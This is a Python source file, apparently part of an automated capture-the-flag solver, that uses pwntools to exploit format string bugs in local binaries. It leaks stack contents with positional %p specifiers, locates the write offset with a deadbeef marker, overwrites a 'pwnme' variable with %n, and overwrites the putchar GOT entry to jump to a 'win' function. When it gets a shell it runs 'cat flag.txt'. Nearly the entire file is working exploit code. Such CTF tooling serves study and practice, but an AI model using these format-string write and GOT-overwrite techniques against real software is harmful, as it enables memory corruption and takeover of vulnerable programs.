from pwn import *
from Print import Print

logging.getLogger('pwnlib').setLevel(logging.WARNING)

fire = "\U0001F525"

class FMT:
    def __init__(self, analysis, v_lvl):
        self.analysis = analysis
        self.filename = analysis.binary
        self.e = ELF(self.filename)
        self.fart_print = Print(v_lvl)
        
        self.fart_print.info("Format string bug likely!")

    def build_exploit(self):
        self.fart_print.info("Attempting to discover the constraings to exploiting the format string bug")
        payload = None
        
        if not self.stack_leak():
            if self.analysis.vuln_has_cmp():
                self.write_prim()
            elif self.analysis.has_putchar():
                self.got_overwrite()

    def stack_leak(self):
        self.fart_print.info("Leaking the values on the stack with format string bug")
        hex_vals = []
        
        # TODO: Variable length
        for i in range(100):
            
            p = process(self.filename)
            p.sendline(b"%" + str(i).encode("utf-8") + b"$p")
            try:
                for i in p.recvline().decode('utf-8').split(' '):
                    if '0x' in i:
                        string = p64(int(i.strip('\n'), 16))
                        hex_vals.append(string.decode('utf-8'))
            except UnicodeDecodeError as e:
                next
            except EOFError:
                break
            p.close()
        
        vals = ''.join(hex_vals)
        print(vals)
        # TODO: Some flags on the stack don't have a right bracket
        if "flag" in vals:
            start = vals.find("flag")
            end = vals.find("}")
            flag = vals[start:end+1]
            flag_stripped = flag.strip("\n")
            self.fart_print.flag(f"{self.analysis.bin_hash},{self.analysis.bin_name},{flag_stripped}")
            return True
        else:
            return False

    def write_prim(self):
        self.fart_print.info("Overwriting the pwnme variable")
        offset = self.find_write_prim_offset()
        if offset:
            # Find the value
            val = self.analysis.get_vuln_args()
            pwnme = p64(self.e.sym["pwnme"])
            payload = f"%{val}d%{offset+1}$n".encode("utf-8")
            payload += self.get_padding(len(payload))
            payload += pwnme

            p = process(self.filename)
            p.sendline(payload)
        
            self.print_flag(p)

    def find_write_prim_offset(self):
        offset = None
        for x in range(100):
            p = process(self.filename)

            payload = f"%{x}$p".encode('utf-8')
            payload += self.get_padding(len(payload))
            payload += b"\xef\xbe\xad\xde"*2
            p.sendline(payload)
            p.recvuntil(b"<<<")
            if b"0xdeadbeefdeadbeef" in p.recvline():
                offset = x
            p.close()

        return offset
    
    def get_padding(self, size):
        return b"A"*(8 - (size % 8))

    def libc_leak(self):
        pass

    def got_overwrite(self):
        self.fart_print.info("GOT overwrite with format string bug")
        offset = self.find_write_prim_offset()
        if offset:
            win = self.e.sym['win']
            putchar = p64(self.e.got['putchar'])

            payload = f"%{win}d%{offset+1}$n".encode('utf-8')
            payload += self.get_padding(len(payload))
            payload += putchar
            
            p = process(self.filename)
            p.sendline(payload)

            self.print_flag(p)

    def print_flag(self, p): 
        if self.analysis.has_catflagtxt():
            p.recvuntil(b"<<<")
            p.recvline()

            flag = p.recvline().decode('utf-8').strip('\n')
            self.fart_print.flag(f"{self.analysis.bin_hash},{self.analysis.bin_name},{flag}")
        elif self.analysis.has_binsh():
            p.sendline(b"cat flag.txt")
            p.recvuntil(b"flag")
            flag = p.recvline().decode('utf-8').strip('\n')
            self.fart_print.flag(f"{self.analysis.bin_hash},{self.analysis.bin_name},flag{flag}")

        p.close()
